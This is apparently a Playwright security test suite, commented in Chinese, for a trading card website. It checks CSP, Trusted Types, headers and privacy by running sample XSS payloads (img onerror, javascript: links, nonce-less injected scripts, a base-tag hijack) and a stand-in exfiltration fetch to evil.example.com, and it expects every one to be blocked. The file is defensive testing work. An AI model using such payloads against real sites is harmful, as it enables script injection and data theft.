import { expect, test, type Page } from '@playwright/test';
import { STATIC_SECURITY_HEADERS } from '../../src/lib/security-headers';

/**
 * 資安端對端測試。
 *
 * 這裡驗證的不是「標頭有沒有設」（那看設定檔就知道），
 * 而是「瀏覽器實際收到什麼」以及「CSP 是否真的擋得住攻擊」。
 */

const PAGES = ['/', '/cards', '/cards/ogn-001-298'];

test.describe('安全標頭', () => {
  for (const path of PAGES) {
    test(`${path} 回傳全部必要的安全標頭`, async ({ request }) => {
      const response = await request.get(path);
      expect(response.status()).toBe(200);
      const headers = response.headers();

      // 逐項比對 src/lib/security-headers.ts 的定義，
      // 「設定」與「驗證」共用同一份來源，不會各說各話。
      for (const { key, value } of STATIC_SECURITY_HEADERS) {
        expect(headers[key.toLowerCase()], `缺少或不符：${key}`).toBe(value);
      }
    });
  }

  test('不洩漏框架資訊', async ({ request }) => {
    const headers = (await request.get('/cards')).headers();
    expect(headers['x-powered-by']).toBeUndefined();
    // Server 標頭若存在，也不該說出用了什麼框架。
    if (headers['server'] !== undefined) {
      expect(headers['server']).not.toMatch(/next/i);
    }
  });
});

test.describe('Content-Security-Policy', () => {
  test('CSP 內容嚴格，且不含任何已知的弱化關鍵字', async ({ request }) => {
    const csp = (await request.get('/cards')).headers()['content-security-policy'];
    expect(csp).toBeTruthy();

    // 這三個是 Google CSP Evaluator 會標為高風險的寫法，一個都不能有。
    expect(csp).not.toContain("'unsafe-inline'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).not.toContain("'unsafe-hashes'");

    // deny by default：沒有明確開放的資源類型一律禁止
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("'strict-dynamic'");
    expect(csp).toMatch(/'nonce-[a-f0-9]{32}'/);

    // 圖片只允許自家網域與 Riot 官方 CDN。
    expect(csp).toContain('img-src');
    expect(csp).toContain('https://cmsassets.rgpub.io');
  });

  test('每次請求的 nonce 都不同，且 HTML 不被快取', async ({ request }) => {
    const a = (await request.get('/cards')).headers();
    const b = (await request.get('/cards')).headers();
    const nonceOf = (csp: string) => /'nonce-([a-f0-9]{32})'/.exec(csp)?.[1];

    expect(nonceOf(a['content-security-policy']!)).not.toBe(
      nonceOf(b['content-security-policy']!),
    );
    // nonce 會寫進 HTML，因此 HTML 絕對不能被快取後重複發送。
    expect(a['cache-control']).toContain('no-store');
  });

  test('頁面上每一個 script 標籤都帶著 nonce', async ({ page }) => {
    await page.goto('/cards');
    const total = await page.locator('script').count();
    const withNonce = await page.locator('script[nonce]').count();
    expect(total).toBeGreaterThan(5);
    expect(withNonce).toBe(total);
  });
});

/** 收集頁面上實際發生的 CSP 違規。 */
async function collectViolations(page: Page): Promise<string[]> {
  const violations: string[] = [];
  await page.exposeFunction('__reportViolation', (v: string) => void violations.push(v));
  await page.addInitScript(() => {
    addEventListener('securitypolicyviolation', (e) => {
      // @ts-expect-error 由 exposeFunction 注入
      window.__reportViolation(`${e.violatedDirective} <- ${e.blockedURI || 'inline'}`);
    });
  });
  return violations;
}

test.describe('CSP 實際攔截能力（主動攻擊測試）', () => {
  test('正常瀏覽不會產生任何 CSP 違規', async ({ page }) => {
    const violations = await collectViolations(page);
    for (const path of PAGES) {
      await page.goto(path);
      await page.waitForLoadState('networkidle');
    }
    expect(violations, `不應有違規，實際：${violations.join(' / ')}`).toEqual([]);
  });

  /*
   * 關於 'strict-dynamic' 的一個重要觀念（也是我在開發時實測確認的）：
   *
   * strict-dynamic 擋的是「HTML 解析器插入的腳本」，也就是真正的 XSS 途徑 ——
   * 攻擊者把 <script> 或 <img onerror> 塞進頁面 HTML 的那種。
   *
   * 它「不」擋用 document.createElement('script') 動態建立的腳本，因為那是
   * webpack 載入分割檔案的必要機制。但要能呼叫 createElement，攻擊者得先能
   * 執行 JavaScript —— 而那正是 CSP 一開始就要阻止的事。
   *
   * 所以下面測的是真實的攻擊面：行內事件處理器、javascript: 協議、
   * 以及把字串當程式碼執行的能力。
   */

  /**
   * 最典型的 XSS payload：`<img src=x onerror="壞事">`
   *
   * 本站有兩道獨立的防線擋它，這個測試同時涵蓋兩道：
   *
   *   第一道 Trusted Types（require-trusted-types-for 'script'）
   *          連「把這段 HTML 寫進 DOM」這個動作本身都會拋出 TypeError，
   *          惡意內容根本進不了頁面。目前 Chromium 系列支援。
   *
   *   第二道 CSP 沒有 'unsafe-inline'
   *          就算 HTML 真的寫進去了（例如在還不支援 Trusted Types 的
   *          Safari 上），onerror 這種行內事件處理器也不會執行。
   *
   * 兩道任一成立，攻擊就失敗 —— 這正是「縱深防禦」的意思：
   * 不依賴單一機制，也不依賴瀏覽器一定支援最新規格。
   */
  test('XSS 最常見的載體：惡意 HTML 進不來，就算進來了也不會執行', async ({ page }) => {
    await page.goto('/cards');

    const result = await page.evaluate(async () => {
      const w = window as unknown as Record<string, unknown>;
      w.__pwned = false;

      const host = document.createElement('div');
      let blockedByTrustedTypes = false;
      try {
        host.innerHTML = '<img src="data:," onerror="window.__pwned = true">';
      } catch {
        blockedByTrustedTypes = true; // Trusted Types 直接拒絕了這次寫入
      }
      document.body.appendChild(host);
      await new Promise((r) => setTimeout(r, 400));

      return { blockedByTrustedTypes, fired: w.__pwned === true };
    });

    // 不論被哪一道擋下，結果都必須是「惡意程式碼沒有執行」。
    expect(result.fired, 'onerror 事件處理器絕對不該執行').toBe(false);

    // 至少要有一道防線真的動作了 —— 否則代表兩道都失效，只是碰巧沒事。
    const cspBlockedIt = !result.blockedByTrustedTypes && !result.fired;
    expect(
      result.blockedByTrustedTypes || cspBlockedIt,
      '應由 Trusted Types 或 CSP 其中之一擋下',
    ).toBe(true);
  });

  test('javascript: 協議的連結不會執行', async ({ page }) => {
    await page.goto('/cards');
    const fired = await page.evaluate(async () => {
      (window as unknown as Record<string, unknown>).__pwned2 = false;
      const a = document.createElement('a');
      a.href = 'javascript:window.__pwned2 = true';
      document.body.appendChild(a);
      a.click();
      await new Promise((r) => setTimeout(r, 300));
      return (window as unknown as Record<string, unknown>).__pwned2 === true;
    });
    expect(fired, 'javascript: 連結不該執行').toBe(false);
  });

  test('CSP 未開放 eval（unsafe-eval 不存在）', async ({ request }) => {
    const csp = (await request.get('/cards')).headers()['content-security-policy']!;
    expect(csp).not.toContain('unsafe-eval');
    expect(csp).toMatch(/script-src [^;]*/);
  });

  test('無法向未授權的網域發出請求（connect-src）', async ({ page }) => {
    await page.goto('/cards');
    const blocked = await page.evaluate(async () => {
      try {
        await fetch('https://evil.example.com/steal');
        return false;
      } catch {
        return true;
      }
    });
    expect(blocked, '連往外部網域的請求應被 connect-src 擋下').toBe(true);
  });

  test('無法從未授權的網域載入圖片（img-src）', async ({ page }) => {
    const violations = await collectViolations(page);
    await page.goto('/cards');
    await page.evaluate(async () => {
      const img = new Image();
      img.src = 'https://evil.example.com/tracker.gif';
      document.body.appendChild(img);
      await new Promise((r) => setTimeout(r, 400));
    });
    await page.waitForTimeout(300);
    expect(violations.some((v) => v.includes('img-src'))).toBe(true);
  });

  test('注入 <base> 竄改所有相對網址會被擋下', async ({ page }) => {
    const violations = await collectViolations(page);
    await page.goto('/cards');
    await page.evaluate(() => {
      const b = document.createElement('base');
      b.href = 'https://evil.example.com/';
      document.head.appendChild(b);
    });
    await page.waitForTimeout(300);
    expect(violations.some((v) => v.includes('base-uri'))).toBe(true);
  });

  test('本站無法被其他網站用 iframe 嵌入（防點擊劫持）', async ({ page }, testInfo) => {
    const target = new URL('/cards', testInfo.project.use.baseURL).toString();
    await page.setContent(`<iframe id="f" src="${target}"></iframe>`);
    await page.waitForTimeout(800);
    const loaded = await page.evaluate(() => {
      const frame = document.getElementById('f') as HTMLIFrameElement;
      try {
        return frame.contentDocument?.body?.childElementCount ?? 0;
      } catch {
        return -1; // 跨來源存取被拒 = 也算被擋
      }
    });
    expect(loaded).toBeLessThanOrEqual(0);
  });
});

/**
 * 攔截伺服器回傳的 HTML，把一段內容插進 </body> 之前 ——
 * 也就是模擬「攻擊者成功把東西塞進網頁原始碼」的情境。
 *
 * 這是這一組測試的關鍵手法。Playwright 平常用的 page.evaluate() 是透過
 * Chrome 開發者工具的通道送程式碼進去，而開發者工具本來就被設計成可以
 * 無視 CSP（否則工程師在 Console 裡什麼都不能做）。用那個管道測 CSP，
 * 測到的是「後門裡的世界」，不是真實訪客看到的世界。
 *
 * 改成把程式碼寫進 HTML，讓瀏覽器自己的 HTML 解析器去處理，
 * 走的就跟真實 XSS 完全同一條路徑，結果才有意義。
 *
 * inject 會拿到這次請求真正的 nonce（從 CSP 回應標頭讀出來）。
 */
async function injectIntoHtml(page: Page, inject: (nonce: string) => string) {
  await page.route('**/cards', async (route) => {
    const response = await route.fetch();
    const csp = response.headers()['content-security-policy'] ?? '';
    const nonce = /'nonce-([a-f0-9]{32})'/.exec(csp)?.[1] ?? '';
    const body = (await response.text()).replace('</body>', `${inject(nonce)}</body>`);
    await route.fulfill({ response, body });
  });
}

test.describe('模擬真實 XSS（把腳本塞進網頁原始碼）', () => {
  test('注入 HTML 的 <script> 不會執行，但合法的會 —— 證明 CSP 有在分辨', async ({ page }) => {
    await injectIntoHtml(
      page,
      (nonce) => `
        <script nonce="${nonce}">window.__controlRan = true;</script>
        <script>window.__attackRan = true;</script>
      `,
    );
    await page.goto('/cards');
    await page.waitForLoadState('networkidle');

    const result = await page.evaluate(() => {
      const w = window as never as Record<string, unknown>;
      return { control: w.__controlRan === true, attack: w.__attackRan === true };
    });

    // 對照組：帶著正確 nonce 的腳本必須執行。
    // 這一條是為了證明「注入機制本身有效」——
    // 否則萬一 HTML 替換失敗，攻擊那條會因為根本沒被注入而假性通過。
    expect(result.control, '對照組應執行，否則代表注入機制失效，測試沒有意義').toBe(true);

    // 攻擊組：沒有 nonce 的腳本必須被擋。這就是真實的 XSS 情境。
    expect(result.attack, '注入的腳本不該執行').toBe(false);
  });

  test('頁面自身的合法腳本也無法使用 eval 或 new Function', async ({ page }) => {
    await injectIntoHtml(
      page,
      (nonce) => `<script nonce="${nonce}">
        (function () {
          var r = [];
          try { eval('1+1'); r.push('eval-allowed'); } catch (e) { r.push('eval-blocked'); }
          try { new Function('return 1')(); r.push('function-allowed'); }
          catch (e) { r.push('function-blocked'); }
          document.documentElement.setAttribute('data-eval-probe', r.join(','));
        })();
      </script>`,
    );
    await page.goto('/cards');
    await page.waitForLoadState('networkidle');

    // 這段腳本帶著正確的 nonce，是「頁面自己的腳本」，
    // 因此它遇到的限制就是真實訪客會遇到的限制。
    const probe = await page.getAttribute('html', 'data-eval-probe');
    expect(probe, '探針腳本沒有執行，測試無效').not.toBeNull();
    expect(probe).toBe('eval-blocked,function-blocked');
  });
});

test.describe('隱私', () => {
  test('除了官方卡圖 CDN 之外，不對任何第三方發出請求', async ({ page }, testInfo) => {
    // 「自己的網域」要從 baseURL 推導，這樣本機與線上網站都能用同一份測試。
    const ownHost = new URL(testInfo.project.use.baseURL!).hostname;

    const thirdParty = new Set<string>();
    page.on('request', (req) => {
      const host = new URL(req.url()).hostname;
      if (host !== ownHost) thirdParty.add(host);
    });

    // 三種語言、兩種卡面都跑一遍，確認沒有任何一條路徑會連到非官方來源。
    for (const path of [
      '/cards',
      '/cards?lang=zh-CN&art=zh-CN',
      '/cards?lang=en',
      '/cards/ogn-001-298?art=zh-CN',
    ]) {
      await page.goto(path);
      await page.waitForLoadState('networkidle');
    }

    // 只允許這兩個官方 CDN：Riot 全球官方，以及中國大陸官方發行商。
    // 特別注意：本站不引用任何第三方社群站台的圖片。
    for (const host of thirdParty) {
      expect(['cmsassets.rgpub.io', 'cdn.playloltcg.com']).toContain(host);
    }
  });

  test('不設定任何 cookie', async ({ page, context }) => {
    await page.goto('/cards');
    await page.waitForLoadState('networkidle');
    expect(await context.cookies()).toEqual([]);
  });

  test('卡圖請求帶 no-referrer，不洩漏使用者瀏覽路徑', async ({ page }) => {
    await page.goto('/cards');
    const policies = await page.locator('img[src*="cmsassets"]').first().getAttribute('referrerpolicy');
    expect(policies).toBe('no-referrer');
  });
});
